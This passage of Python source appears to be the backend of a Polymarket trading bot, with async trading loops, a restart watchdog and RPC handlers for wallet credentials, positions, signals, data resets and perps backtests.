                    if copy_trader.last_open_count > 0 or now < copy_hot_until:
                        iv = min(base_iv, fast_iv)
                    due = now - last_copy >= iv
                if due:
                    copy_changed = await copy_trader.run_tick(cfg, authed=STATE.auth_ok)
                    for row in copy_changed:
                        await emit_event("position:update", _position_row_to_js(row))
                    last_copy = now
        except Exception as e:
            logger.error(f"copy tick error: {e}", exc_info=True)

        await _copy_sleep(1.0)


async def _copy_sleep(seconds: float) -> None:
    ev = _copy_wake
    if ev is None:
        await asyncio.sleep(seconds)
        return
    try:
        await asyncio.wait_for(ev.wait(), timeout=seconds)
    except (asyncio.TimeoutError, TimeoutError):
        return
    finally:
        ev.clear()


async def _crypto15m_loop() -> None:
    await _engine_supervisor("crypto15m", _crypto15m_loop_body, "_crypto_heartbeat")


async def _crypto15m_loop_body() -> None:
    global _crypto_heartbeat
    _crypto_heartbeat = asyncio.get_event_loop().time()
    last_tick = 0.0
    while not (_loop_stop and _loop_stop.is_set()):
        now = asyncio.get_event_loop().time()
        _crypto_heartbeat = now
        cfg = STATE.cfg

        if STATE.paused:
            await asyncio.sleep(1)
            continue

        try:
            async with _block("crypto15m:feeds"):
                try:
                    if bool(cfg.get("crypto15m_spot_ws", True)):
                        if not spot_ws.is_running():
                            spot_ws.start()
                    elif spot_ws.is_running():
                        await spot_ws.stop()
                except Exception as e:
                    logger.debug(f"spot_ws lifecycle: {e}")
                if bool(cfg.get("crypto15m_rtds_ws", True)):
                    if not rtds_ws.is_running():
                        rtds_ws.start()
                elif rtds_ws.is_running():
                    await rtds_ws.stop()
        except Exception as e:
            logger.debug(f"rtds_ws lifecycle: {e}")

        if not STATE.auth_ok:
            await asyncio.sleep(1)
            continue

        if user_ws.feed.wake is None:
            user_ws.feed.wake = asyncio.Event()
        if not user_ws.feed.is_running():
            user_ws.feed.start()
        woke = user_ws.feed.wake.is_set()
        if woke:
            user_ws.feed.wake.clear()

        try:
            async with _block("crypto15m:tick"):
                poll = float(cfg.get("crypto15m_poll_sec", 4))
                if now - last_tick >= poll or (woke and now - last_tick >= 0.5):
                    changed = await crypto15m_trader.run_tick(cfg, authed=STATE.auth_ok)
                    last_tick = now
                    if changed:
                        _fire_and_forget(trader.refresh_balance(cfg, force=True))
        except Exception as e:
            logger.error(f"crypto15m tick error: {e}", exc_info=True)

        await asyncio.sleep(1)


async def _perps_loop() -> None:
    await _engine_supervisor("perps", _perps_loop_body, "_perps_heartbeat")


async def _perps_loop_body() -> None:
    global _perps_heartbeat
    loop = asyncio.get_event_loop()
    _perps_heartbeat = loop.time()
    feed = perps_ws.feed
    feed.wake = asyncio.Event()
    feed.start()
    last_tick = 0.0
    last_fast = 0.0
    while not (_loop_stop and _loop_stop.is_set()):
        now = loop.time()
        _perps_heartbeat = now
        cfg = STATE.cfg
        if STATE.paused or not perps_api.creds():
            feed.set_instruments([])
            await asyncio.sleep(1)
            continue
        try:
            async with _block("perps:tick"):
                poll = float(cfg.get("perps_poll_sec", 2))
                if now - last_tick >= poll:
                    last_tick = now
                    await perps_maker.run_tick(cfg)
                elif feed.wake.is_set():
                    feed.wake.clear()
                    moved = feed.take_moved()
                    if moved and now - last_fast >= _PERPS_FAST_MIN_SEC:
                        last_fast = now
                        await perps_maker.run_fast(cfg, moved)
        except Exception as e:
            logger.error(f"perps tick error: {e}", exc_info=True)
        wait = max(0.05, min(0.5, last_tick + float(cfg.get("perps_poll_sec", 2)) - loop.time()))
        try:
            await asyncio.wait_for(feed.wake.wait(), timeout=wait)
        except (asyncio.TimeoutError, TimeoutError):
            pass


async def _start_loop() -> None:
    global _loop_task, _loop_stop, _watchdog_task
    global _copy_task, _crypto_task, _copy_wake, _perps_task
    if _loop_task and not _loop_task.done():
        return
    _loop_stop = asyncio.Event()
    _copy_wake = asyncio.Event()
    _loop_task = asyncio.create_task(_scanner_and_trader_loop())
    _copy_task = asyncio.create_task(_copy_loop())
    _crypto_task = asyncio.create_task(_crypto15m_loop())
    _perps_task = asyncio.create_task(_perps_loop())
    _loop_restart_state.clear()
    if not _watchdog_task or _watchdog_task.done():
        _watchdog_task = asyncio.create_task(_loop_watchdog())


async def _stop_loop() -> None:
    global _loop_task, _loop_stop, _watchdog_task, _copy_task, _crypto_task, _perps_task
    if _loop_stop:
        _loop_stop.set()
    _wake_copy("stop")
    if _watchdog_task:
        _watchdog_task.cancel()
        try:
            await asyncio.wait_for(_watchdog_task, timeout=5)
        except BaseException:
            pass
        _watchdog_task = None
    for _attr in ("_loop_task", "_copy_task", "_crypto_task", "_perps_task"):
        task = globals().get(_attr)
        if not task:
            continue
        try:
            await asyncio.wait_for(task, timeout=5)
        except BaseException:
            task.cancel()
            try:
                await asyncio.wait_for(task, timeout=2)
            except BaseException:
                pass
        globals()[_attr] = None


async def _restart_engine_loop(label: str, task_attr: str, factory_attr: str,
                               *, stalled: float | None = None) -> None:
    task = globals().get(task_attr)
    if task is not None and not task.done():
        try:
            await emit_event(
                "backend:loopStalled",
                {"loop": label, "stalledSec": round(stalled or 0.0)},
            )
        except Exception:
            pass
        task.cancel()
        try:
            await asyncio.wait_for(task, timeout=10)
        except BaseException:
            pass
    if _loop_stop and _loop_stop.is_set():
        return
    for _name, _mod in (("polymarket_api", polymarket_api), ("crypto15m", crypto15m),
                        ("perps_api", perps_api)):
        try:
            await _mod.close_clients()
        except Exception as e:
            logger.debug(f"watchdog client recycle ({_name}) failed: {e}")
    globals()[task_attr] = asyncio.create_task(globals()[factory_attr]())
    logger.info(f"{label} loop restarted by watchdog (HTTP clients recycled)")


def _restart_allowed(label: str, now: float) -> float:
    st = _loop_restart_state.get(label)
    if st is None:
        return 0.0
    if now < float(st.get("not_before", 0.0)):
        return float(st["not_before"]) - now
    return 0.0


def _note_restart(label: str, now: float) -> None:
    st = _loop_restart_state.get(label) or {"n": 0, "last": 0.0}
    st["n"] = (int(st.get("n", 0)) + 1) if (now - float(st.get("last", 0.0)) < 60.0) else 1
    st["last"] = now
    delay = 0.0 if st["n"] <= 1 else min(
        _LOOP_RESTART_BACKOFF_MAX, 2.0 ** (st["n"] - 1)
    )
    st["not_before"] = now + delay
    _loop_restart_state[label] = st
    if delay:
        logger.warning(
            f"{label} loop has restarted {st['n']}x in a minute - backing off "
            f"{delay:.0f}s before the next restart"
        )


async def _loop_watchdog() -> None:
    while not (_loop_stop and _loop_stop.is_set()):
        try:
            await asyncio.sleep(_WATCHDOG_CHECK_SEC)
        except asyncio.CancelledError:
            break
        if _loop_stop and _loop_stop.is_set():
            break
        for label, task_attr, hb_attr, factory_attr, stall_attr in _ENGINE_LOOPS:
            if _loop_stop and _loop_stop.is_set():
                break
            task = globals().get(task_attr)
            if not task:
                continue
            now = asyncio.get_event_loop().time()
            stalled: float | None = None
            if task.done():
                try:
                    _exc = task.exception()
                except BaseException:
                    _exc = None
                reason = f"{label} loop task ended unexpectedly ({_exc!r})"
            else:
                hb = float(globals().get(hb_attr) or 0.0)
                if hb <= 0:
                    continue
                stalled = now - hb
                if stalled < float(globals()[stall_attr]):
                    continue
                reason = f"{label} loop stalled {stalled:.0f}s with no heartbeat"
            wait = _restart_allowed(label, now)
            if wait > 0:
                logger.warning(f"{reason} - restart held off {wait:.0f}s (backoff)")
                continue
            logger.critical(f"{reason} - restarting it")
            _note_restart(label, now)
            try:
                await _restart_engine_loop(
                    label, task_attr, factory_attr, stalled=stalled,
                )
            except Exception as e:
                logger.error(f"{label} loop restart failed: {e}", exc_info=True)


async def _h_ping(_p: dict) -> dict:
    return {"pong": True, "ts": datetime.now(timezone.utc).isoformat()}


async def _h_setConfig(p: dict) -> dict:
    cfg = merge_with_defaults(p.get("config") or {})
    STATE.cfg = cfg
    import backtest as _bt
    _bt.set_taker_rebate(cfg.get("taker_rebate_pct"))
    crypto15m.set_taker_rebate(cfg.get("taker_rebate_pct"))
    logger.info(
        f"setConfig applied: enable_trading={cfg.get('enable_trading')} "
        f"crypto15m={cfg.get('crypto15m_enabled')} copy={cfg.get('copy_enabled')} "
        f"trade_whales={cfg.get('trade_whales')} "
        f"trade_momentum={cfg.get('trade_momentum')} "
        f"max_open={cfg.get('max_open_positions')} "
        f"max_daily="
        f"{'∞' if cfg.get('unlimited_daily_new_positions') else cfg.get('max_daily_new_positions')} "
        f"stop_loss={cfg.get('stop_loss_on_day')} "
        f"env={cfg.get('network')}"
    )
    new_env = cfg.get("network", "mainnet")
    prev_env = polymarket_auth.get_env()
    polymarket_auth.set_env(new_env)

    if new_env != prev_env:
        polymarket_auth.reset_credential_cache()
        if polymarket_auth.credentials_present(new_env):
            STATE.auth_ok = await _establish_auth()
        else:
            STATE.auth_ok = False
        await emit_event("backend:authChanged", {"authOk": STATE.auth_ok})

        try:
            if STATE.active_run_id:
                with db.get_db() as conn:
                    db.end_bot_run(conn, STATE.active_run_id)
                STATE.active_run_id = 0
            if STATE.auth_ok:
                cents, port = await trader.refresh_balance(STATE.cfg, force=True)
                with db.get_db() as conn:
                    stats = db.aggregate_stats(conn, new_env)
                    STATE.active_run_id = db.start_bot_run(
                        conn, env=new_env,
                        cash_usd=cents / 100.0,
                        portfolio_usd=port / 100.0,
                        lifetime_trades=int(stats.get("total_opened") or 0),
                        lifetime_wins=int(stats.get("wins") or 0),
                        lifetime_losses=int(stats.get("losses") or 0),
                    )
                logger.info(
                    f"Bot run #{STATE.active_run_id} started after env switch "
                    f"(env={new_env})"
                )
        except Exception as e:
            logger.warning(f"could not roll bot_run on env switch: {e}")
    try:
        await _mcp_sync()
    except Exception as e:
        logger.warning(f"mcp sync failed: {e}")
    return {"ok": True}


async def _h_setCredentials(p: dict) -> dict:
    p = p or {}
    private_key = p.get("privateKey") or p.get("apiKey") or ""
    api_creds = p.get("apiCreds")
    env = p.get("env")
    funder = p.get("funder")
    sig_type = p.get("signatureType")
    if not private_key and polymarket_auth.credentials_present(env):
        sig = sig_type if sig_type is not None else (
            polymarket_auth.SIGNATURE_TYPE_POLY_1271 if (funder or "").strip() else 0
        )
        polymarket_auth.set_wallet_meta(
            funder=(funder or "").strip(), signature_type=int(sig), env=env,
        )
        polymarket_auth.reset_credential_cache()
    else:
        polymarket_auth.save_credentials(
            private_key, api_creds, env, funder=funder, signature_type=sig_type,
        )
    try:
        polymarket_api._creds_derived = False
    except Exception:
        pass

    active_env = env or polymarket_auth.get_env()
    global _sig_type_reconciled
    _sig_type_reconciled = False
    try:
        trader._balance_cache.pop(active_env, None)
    except Exception:
        pass
    if active_env in (None, polymarket_auth.get_env()):
        try:
            STATE.auth_ok = (
                await _establish_auth()
                if polymarket_auth.credentials_present(active_env) else False
            )
            await emit_event("backend:authChanged", {"authOk": STATE.auth_ok})
        except Exception as e:
            logger.warning(f"auth re-verify after wallet change failed: {e}")
        try:
            if STATE.active_run_id:
                with db.get_db() as conn:
                    db.end_bot_run(conn, STATE.active_run_id)
                STATE.active_run_id = 0
            if STATE.auth_ok:
                cents, port = await trader.refresh_balance(STATE.cfg, force=True)
                env_now = polymarket_auth.get_env()
                with db.get_db() as conn:
                    stats = db.aggregate_stats(conn, env_now)
                    STATE.active_run_id = db.start_bot_run(
                        conn, env=env_now,
                        cash_usd=cents / 100.0, portfolio_usd=port / 100.0,
                        lifetime_trades=int(stats.get("total_opened") or 0),
                        lifetime_wins=int(stats.get("wins") or 0),
                        lifetime_losses=int(stats.get("losses") or 0),
                    )
                logger.info(
                    f"Bot run #{STATE.active_run_id} started after wallet change "
                    f"(env={env_now})"
                )
        except Exception as e:
            logger.warning(f"could not roll bot_run on wallet change: {e}")

    status = polymarket_auth.credentials_status_all()
    await emit_event("credentials:changed", status)
    return status


async def _h_clearCredentials(p: dict) -> dict:
    p = p or {}
    env = p.get("env")
    polymarket_auth.clear_credentials(env)
    if env in (None, polymarket_auth.get_env()):
        STATE.auth_ok = False
        await emit_event("backend:authChanged", {"authOk": False})
    status = polymarket_auth.credentials_status_all()
    await emit_event("credentials:changed", status)
    return status


async def _h_credentialStatus(_p: dict) -> dict:
    return polymarket_auth.credentials_status_all()


_sig_type_reconciled = False


async def _reconcile_signature_type() -> None:
    global _sig_type_reconciled
    if _sig_type_reconciled:
        return
    try:
        funder = polymarket_auth.get_funder()
        if not funder:
            _sig_type_reconciled = True
            return
        stored = polymarket_auth.get_signature_type()
        detected = await polymarket_api.detect_wallet_signature_type()
        if detected is None:
            return
        if int(detected) != int(stored):
            polymarket_auth.set_wallet_meta(funder=funder, signature_type=int(detected))
            logger.warning(
                f"[wallet] repaired signatureType {stored}→{detected} for deposit {funder} "
                f"(a previous version stored the wrong scheme; orders were being rejected)"
            )
        _sig_type_reconciled = True
    except Exception as e:
        logger.debug(f"[wallet] signature-type reconcile skipped: {e}")


async def _establish_auth(retries: int = 3) -> bool:
    last_exc = None
    for attempt in range(1, retries + 1):
        try:
            polymarket_auth.prime_credentials(sync_time=True)
            await polymarket_api.ensure_api_creds()
        except Exception as e:
            last_exc = e
            logger.warning(f"auth verify attempt {attempt}/{retries} failed: {e}")
            if attempt < retries:
                await asyncio.sleep(1.5 * attempt)
            continue
        await _reconcile_signature_type()
        try:
            await polymarket_api.get_balance()
        except Exception as be:
            logger.debug(f"auth verify: balance warm failed (non-fatal): {be}")
        return True
    logger.warning(f"auth verify failed after {retries} attempts: {last_exc}")
    return False


async def _h_testCredentials(p: dict) -> dict:
    p = p or {}
    target_env = polymarket_auth.get_env()
    if not polymarket_auth.credentials_present(target_env):
        raise RuntimeError("wallet key not set")

    polymarket_auth.reset_credential_cache()
    polymarket_auth.prime_credentials(sync_time=True)
    ready = await polymarket_api.check_trading_ready()
    if not ready.get("address"):
        STATE.auth_ok = False
        await emit_event("backend:authChanged", {"authOk": False})
        raise RuntimeError(
            (ready.get("issues") or ["could not connect to Polymarket"])[0]
        )
    STATE.auth_ok = True
    await emit_event("backend:authChanged", {"authOk": True})
    for msg in ready.get("issues", []):
        logger.warning(f"trading-readiness: {msg}")
    signer_ok = ready.get("signerOk")
    if signer_ok is True:
        logger.info(
            "trading-readiness: LIVE SIGNER CHECK PASSED — the exchange accepted "
            "an order signed by this wallet (key↔deposit-wallet pairing proven)"
        )
    elif signer_ok is False:
        logger.warning(
            "trading-readiness: LIVE SIGNER CHECK FAILED — see the issue above"
        )
    else:
        logger.warning(
            "trading-readiness: live signer check did NOT run (no suitable "
            "market, a transient error, or balance below the probe threshold) "
            "— this wallet's ability to place an order is still UNPROVEN"
        )
    if not ready.get("issues"):
        logger.info(
            "trading-readiness: wallet connected; balance + approvals look OK"
        )
    return {
        "env": target_env,
        "balanceUsd": ready.get("balanceUsd", 0.0),
        "ready": ready.get("ok", False),
        "approvalsOk": ready.get("approvalsOk"),
        "signerOk": ready.get("signerOk"),
        "issues": ready.get("issues", []),
        "address": ready.get("address", ""),
    }


async def _h_account(_p: dict) -> dict:
    return await _build_account_snapshot()


async def _h_pnlSeries(p: dict) -> list:
    hours = int((p or {}).get("sinceHours", 168))
    env = polymarket_auth.get_env()
    with db.get_db() as conn:
        rows = db.get_pnl_snapshots(conn, since_hours=hours, env=env)
    return [
        {
            "at": _iso_utc(r["at"]),
            "cashUsd": float(r["cash_usd"] or 0),
            "portfolioUsd": float(r["portfolio_usd"] or 0),
            "totalUsd": float(r["total_usd"] or 0),
            "realizedPnlUsd": float(r["realized_pnl_usd"] or 0),
            "openPositions": int(r["open_positions"] or 0),
        }
        for r in rows
    ]


async def _h_positions(p: dict) -> list:
    f = p or {}
    status = f.get("status")
    resolved = f.get("resolved")
    src = f.get("signalSource")
    limit = int(f.get("limit") or 500)

    sql = "SELECT * FROM bot_positions WHERE 1=1"
    args: list = []
    if status:
        placeholders = ",".join("?" for _ in status)
        sql += f" AND status IN ({placeholders})"
        args.extend(status)
    if resolved is not None:
        sql += " AND resolved = ?"
        args.append(1 if resolved else 0)
    if src:
        sql += " AND signal_source = ?"
        args.append(src)
    sql += " ORDER BY created_at DESC LIMIT ?"
    args.append(limit)

    with db.get_db() as conn:
        rows = conn.execute(sql, args).fetchall()
    return [_position_row_to_js(dict(r)) for r in rows]


async def _h_signals(p: dict) -> list:
    f = p or {}
    src = f.get("source")
    min_conf = float(f.get("minConfidence") or 0)
    limit = int(f.get("limit") or 200)

    out: list[dict] = []
    env = polymarket_auth.get_env()
    with db.get_db() as conn:
        if src in (None, "whale"):
            rows = conn.execute(
                """SELECT * FROM whale_trades
                   WHERE confidence >= ?
                   ORDER BY created_at DESC LIMIT ?""",
                (min_conf, limit),
            ).fetchall()
            seen = db.already_traded_signal_ids(conn, "whale", env)
            for r in rows:
                d = dict(r)
                out.append(_signal_row_to_js(d, "whale", int(d["id"]) in seen))
        if src in (None, "momentum"):
            rows = conn.execute(
                """SELECT * FROM alerts
                   WHERE confidence >= ?
                   ORDER BY created_at DESC LIMIT ?""",
                (min_conf, limit),
            ).fetchall()
            seen = db.already_traded_signal_ids(conn, "momentum", env)
            for r in rows:
                d = dict(r)
                out.append(_signal_row_to_js(d, "momentum", int(d["id"]) in seen))
    out.sort(key=lambda s: s["createdAt"], reverse=True)
    return out[:limit]


async def _h_scannerStats(_p: dict) -> dict:
    with db.get_db() as conn:
        markets = conn.execute(
            "SELECT COUNT(*) FROM markets WHERE status IN ('active','open')"
        ).fetchone()[0]
        wt = conn.execute(
            """SELECT COUNT(*) AS total,
                      SUM(CASE WHEN discord_sent=1 THEN 1 ELSE 0 END) AS sent,
                      SUM(CASE WHEN resolved=1 THEN 1 ELSE 0 END) AS resolved,
                      SUM(CASE WHEN outcome_correct=1 THEN 1 ELSE 0 END) AS wins
               FROM whale_trades"""
        ).fetchone()
        al = conn.execute(
            """SELECT COUNT(*) AS total,
                      SUM(CASE WHEN discord_sent=1 THEN 1 ELSE 0 END) AS sent,
                      SUM(CASE WHEN resolved=1 THEN 1 ELSE 0 END) AS resolved,
                      SUM(CASE WHEN outcome_correct=1 THEN 1 ELSE 0 END) AS wins
               FROM alerts"""
        ).fetchone()

    def wr(d) -> dict:
        total = int(d["total"] or 0)
        resolved = int(d["resolved"] or 0)
        wins = int(d["wins"] or 0)
        return {
            "total": total,
            "sent": int(d["sent"] or 0),
            "resolved": resolved,
            "winRate": (wins / resolved * 100.0) if resolved else 0.0,
        }

    return {
        "whales": wr(wt),
        "momentum": wr(al),
        "marketsTracked": int(markets or 0),
        "lastWhaleScanAt": STATE.last_whale_scan_at,
        "lastMomentumScanAt": STATE.last_momentum_scan_at,
        "lastTradeScanAt": STATE.last_trade_scan_at,
    }


async def _h_cancelAllOpen(_p: dict) -> dict:
    if not STATE.auth_ok:
        raise RuntimeError("not authenticated")
    n = await trader.cancel_all_open()
    return {"canceled": n}


async def _h_flatten(_p: dict) -> dict:
    if not STATE.auth_ok:
        raise RuntimeError("not authenticated")
    r = await trader.flatten_open_positions(STATE.cfg)
    try:
        await emit_event("backend:reconciled", {"flattened": r["sold"]})
    except Exception:
        pass
    return {"closed": r["canceled"] + r["sold"], **r}


async def _h_runOnce(p: dict) -> dict:
    action = (p or {}).get("action")
    if action == "syncMarkets":
        cnt = await scanner.sync_markets(max_pages=10)
        return {"summary": f"Synced {cnt} markets"}
    if action == "pollOrders":
        upd = await trader.poll_open_orders(STATE.cfg)
        return {"summary": f"Polled, {len(upd)} updates"}
    if action == "resolveAll":
        rp = await trader.mark_resolved_positions(STATE.cfg)
        ra = await scanner.resolve_alerts_from_markets()
        rw = await scanner.resolve_whales_from_markets()
        return {"summary": f"Positions:{len(rp)} alerts:{ra} whales:{rw}"}
    if action == "reconcilePositions":
        s, changed = await trader.reconcile_positions_with_polymarket()
        for row in changed:
            await emit_event("position:update", _position_row_to_js(row))
        return {
            "summary": (
                f"Reconciled — rescued {s.get('rescued', 0)}, "
                f"resurrected {s.get('resurrected', 0)}, "
                f"imported {s.get('imported_unknowns', 0)}"
            ),
        }
    if action == "syncPositions":
        polled = await trader.poll_open_orders(STATE.cfg)
        s, changed = await trader.reconcile_positions_with_polymarket()
        exited = await trader.detect_external_exits(STATE.cfg)
        emitted: set = set()
        for row in [*polled, *changed, *exited]:
            try:
                js = _position_row_to_js(row)
            except Exception:
                continue
            if js.get("id") in emitted:
                continue
            emitted.add(js.get("id"))
            await emit_event("position:update", js)
        try:
            await trader.refresh_balance(STATE.cfg, force=True)
            await emit_event("account:update", await _build_account_snapshot())
        except Exception as e:
            logger.debug(f"syncPositions balance refresh failed: {e}")
        return {
            "summary": (
                f"Synced — {len(polled)} order update(s), "
                f"rescued {s.get('rescued', 0)}, resurrected {s.get('resurrected', 0)}, "
                f"imported {s.get('imported_unknowns', 0)}, "
                f"closed {len(exited)} exited externally"
            ),
        }
    if action == "recomputePnl":
        s = await trader.recompute_pnl_from_polymarket()
        return {
            "summary": f"Re-resolved {s['recomputed']} of {s['cleared']} positions from Polymarket",
        }
    if action == "reconcileFills":
        s = await trader.reconcile_fills_from_polymarket()
        return {
            "summary": (
                f"Reconciled {s['fills_reconciled']} orders from Polymarket fills, "
                f"re-resolved {s['pnl_recomputed']} of {s['pnl_cleared']}"
            ),
        }
    if action == "auditPnl":
        s = await trader.audit_pnl(200)
        worst_lines = []
        for x in s.get("samples", [])[:8]:
            worst_lines.append(
                f"  {x['ticker']} {x['direction']}: stored ${x['stored_pnl']:+.2f} → fresh ${x['fresh_pnl']:+.2f} (Δ ${x['delta']:+.2f})"
            )
        msg = (
            f"Audited {s['checked']} resolved positions: {s['flagged']} flagged. "
            f"Sum stored=${s['sum_stored_pnl']:+.2f} vs fresh=${s['sum_recompute_pnl']:+.2f} "
            f"(Δ ${s['delta']:+.2f})"
        )
        if worst_lines:
            msg += "\n" + "\n".join(worst_lines)
        return {"summary": msg, "audit": s}
    raise ValueError(f"unknown action: {action}")


async def _h_pause(p: dict) -> dict:
    STATE.paused = bool((p or {}).get("paused", False))
    return {"paused": STATE.paused}


def _run_row_to_js(r: dict) -> dict:
    return {
        "id": int(r["id"]),
        "network": r.get("network") or "mainnet",
        "startedAt": _iso_utc(r.get("started_at")) or "",
        "endedAt": _iso_utc(r.get("ended_at")),
        "startCashUsd": float(r.get("start_cash_usd") or 0),
        "startPortfolioUsd": float(r.get("start_portfolio_usd") or 0),
        "startTotalUsd": float(r.get("start_total_usd") or 0),
        "endCashUsd": (
            float(r["end_cash_usd"])
            if r.get("end_cash_usd") is not None else None
        ),
        "endPortfolioUsd": (
            float(r["end_portfolio_usd"])
            if r.get("end_portfolio_usd") is not None else None
        ),
        "endTotalUsd": (
            float(r["end_total_usd"])
            if r.get("end_total_usd") is not None else None
        ),
        "pnlUsd": float(r.get("pnl_usd") or 0),
        "tradesOpened": int(r.get("trades_opened") or 0),
        "tradesWon": int(r.get("trades_won") or 0),
        "tradesLost": int(r.get("trades_lost") or 0),
        "isActive": r.get("ended_at") is None,
    }


async def _h_botRuns(p: dict) -> dict:
    env = (p or {}).get("env")
    limit = int((p or {}).get("limit") or 100)
    with db.get_db() as conn:
        rows = db.get_recent_runs(conn, env=env, limit=limit)
        active = (
            db.get_active_run(conn, polymarket_auth.get_env())
            if STATE.active_run_id else None
        )
    return {
        "runs": [_run_row_to_js(r) for r in rows],
        "activeRunId": STATE.active_run_id,
        "activeRun": _run_row_to_js(active) if active else None,
    }


async def _h_shutdown(_p: dict) -> dict:
    t = asyncio.create_task(_shutdown())
    _bg_tasks.add(t)
    t.add_done_callback(_bg_tasks.discard)
    return {"shutting_down": True}


async def _h_factoryReset(_p: dict) -> dict:
    logger.warning("factory reset: STARTING — pausing trader loop")
    await _stop_loop()

    if STATE.active_run_id:
        try:
            with db.get_db() as conn:
                db.end_bot_run(conn, STATE.active_run_id)
        except Exception as e:
            logger.warning(f"factoryReset: end_bot_run: {e}")
        STATE.active_run_id = 0

    summary = await asyncio.to_thread(db.factory_reset)
    deleted_total = sum(
        v for k, v in summary.items()
        if not k.startswith("_") and isinstance(v, int) and v > 0
    )
    if summary.get("_errors"):
        logger.error(
            f"factory reset: PARTIAL — deleted {deleted_total} rows, "
            f"errors={summary['_errors']}"
        )
    else:
        logger.warning(
            f"factory reset: COMPLETE — deleted {deleted_total} rows "
            f"({summary})"
        )

    STATE.last_whale_scan_at = ""
    STATE.last_momentum_scan_at = ""
    STATE.last_trade_scan_at = ""

    if STATE.auth_ok:
        try:
            cents, port = await trader.refresh_balance(STATE.cfg, force=True)
            env = polymarket_auth.get_env()
            with db.get_db() as conn:
                stats = db.aggregate_stats(conn, env)
                STATE.active_run_id = db.start_bot_run(
                    conn, env=env,
                    cash_usd=cents / 100.0,
                    portfolio_usd=port / 100.0,
                    lifetime_trades=int(stats.get("total_opened") or 0),
                    lifetime_wins=int(stats.get("wins") or 0),
                    lifetime_losses=int(stats.get("losses") or 0),
                )
            logger.info(
                f"Bot run #{STATE.active_run_id} started after factory reset "
                f"(env={env}, "
                f"start_total=${(cents + port) / 100:.2f})"
            )
        except Exception as e:
            logger.warning(f"factoryReset: post-reset run start: {e}")

    await emit_event("data:reset", {"summary": summary})
    snap = await _build_account_snapshot()
    await emit_event("account:update", snap)

    await _start_loop()
    logger.info("factory reset: trader loop resumed")

    return {"ok": True, "deleted": summary}


async def _h_clearHistory(_p: dict) -> dict:
    logger.warning("clear history: STARTING — pausing trader loop")
    await _stop_loop()

    if STATE.active_run_id:
        try:
            with db.get_db() as conn:
                db.end_bot_run(conn, STATE.active_run_id)
        except Exception as e:
            logger.warning(f"clearHistory: end_bot_run: {e}")
        STATE.active_run_id = 0

    summary = await asyncio.to_thread(db.clear_trade_history)
    deleted_total = sum(
        v for k, v in summary.items()
        if not k.startswith("_") and isinstance(v, int) and v > 0
    )
    if summary.get("_errors"):
        logger.error(
            f"clear history: PARTIAL — deleted {deleted_total} rows, "
            f"errors={summary['_errors']}"
        )
    else:
        logger.warning(
            f"clear history: COMPLETE — deleted {deleted_total} rows "
            f"({summary})"
        )

    if STATE.auth_ok:
        try:
            cents, port = await trader.refresh_balance(STATE.cfg, force=True)
            env = polymarket_auth.get_env()
            with db.get_db() as conn:
                stats = db.aggregate_stats(conn, env)
                STATE.active_run_id = db.start_bot_run(
                    conn, env=env,
                    cash_usd=cents / 100.0,
                    portfolio_usd=port / 100.0,
                    lifetime_trades=int(stats.get("total_opened") or 0),
                    lifetime_wins=int(stats.get("wins") or 0),
                    lifetime_losses=int(stats.get("losses") or 0),
                )
            logger.info(
                f"Bot run #{STATE.active_run_id} started after clear history "
                f"(env={env}, start_total=${(cents + port) / 100:.2f})"
            )
        except Exception as e:
            logger.warning(f"clearHistory: post-clear run start: {e}")

    await emit_event("data:reset", {"summary": summary})
    snap = await _build_account_snapshot()
    await emit_event("account:update", snap)

    await _start_loop()
    logger.info("clear history: trader loop resumed")

    return {"ok": True, "deleted": summary}


async def _h_crypto15m(_p: dict) -> dict:
    return await crypto15m.snapshot(STATE.cfg)


async def _h_crypto15mStatus(_p: dict) -> dict:
    return await crypto15m_trader.status(STATE.cfg, authed=STATE.auth_ok)


async def _h_perps_board(_p: dict) -> dict:
    return await perps_board.snapshot(STATE.cfg)


async def _h_perps_status(_p: dict) -> dict:
    if not perps_api.creds():
        try:
            await perps_maker.preview(STATE.cfg)
        except Exception as e:
            logger.debug(f"perps preview: {e}")
    return perps_maker.status(STATE.cfg)


async def _h_perps_link(_p: dict) -> dict:
    try:
        link = await perps_api.link_account()
    except perps_api.PerpsAPIError as e:
        return {"ok": False, "message": str(e)}
    except FileNotFoundError:
        return {"ok": False, "message": "Connect your Polymarket wallet first (Wallet page)."}
    return {"ok": True, "message": "Perps account linked.", "link": link}


async def _h_perps_unlink(_p: dict) -> dict:
    c = perps_api.creds()
    if c:
        try:
            await perps_maker.cancel_ours(c)
        except Exception:
            pass
    perps_api.unlink_account()
    return {"ok": True, "message": "Perps account unlinked."}


async def _h_data_user_pnl(p: dict) -> dict:
    try:
        user = polymarket_auth.trading_address()
    except Exception:
        return {"ok": False, "message": "Connect your wallet to see Polymarket's P&L."}
    try:
        return {"ok": True, "user": user, **(await data_v2.user_pnl(user, str(p.get("interval") or "1w")))}
    except Exception as e:
        return {"ok": False, "message": f"Polymarket P&L unavailable: {e}"}


async def _h_data_resolutions(p: dict) -> dict:
    ids = [str(c) for c in (p.get("conditionIds") or []) if c][:200]
    try:
        return {"ok": True, "resolutions": await data_v2.resolutions(ids)}
    except Exception as e:
        return {"ok": False, "message": str(e), "resolutions": {}}


async def _h_data_holders(p: dict) -> dict:
    cid = str(p.get("conditionId") or "")
    if not cid.startswith("0x"):
        return {"ok": False, "message": "conditionId required", "holders": []}
    try:
        return {"ok": True, "holders": await data_v2.holders(cid, int(p.get("limit") or 10))}
    except Exception as e:
        return {"ok": False, "message": str(e), "holders": []}


async def _h_data_biggest_winners(p: dict) -> dict:
    try:
        return {"ok": True, "winners": await data_v2.biggest_winners(
            str(p.get("period") or "week"), str(p.get("category") or "overall"),
            int(p.get("limit") or 20))}
    except Exception as e:
        return {"ok": False, "message": str(e), "winners": []}


_perps_bt_lock = asyncio.Lock()


async def _h_perps_backtest(p: dict) -> dict:
    import perps_backtest
    if _perps_bt_lock.locked():
        return {"ok": False, "message": "A Perps backtest is already running."}
    async with _perps_bt_lock:
        try:
            return await perps_backtest.run(
                STATE.cfg,
                days=float(p.get("days") or 3),
                markets=[str(s) for s in (p.get("markets") or [])] or None,
                variants=p.get("variants") if isinstance(p.get("variants"), list) else None,
                grid=p.get("grid") if isinstance(p.get("grid"), dict) else None,
                fee_tier=int(p.get("feeTier") or 0),
                queue_share=float(p.get("queueShare") if p.get("queueShare") is not None else 0.5),
                latency_ms=int(p.get("latencyMs") if p.get("latencyMs") is not None else 250),
            )
        except Exception as e:
            logger.error(f"perps backtest failed: {e}", exc_info=True)
            return {"ok": False, "message": f"Backtest failed: {e}"}


async def _h_perps_flatten(_p: dict) -> dict:
    return await perps_maker.flatten_all()


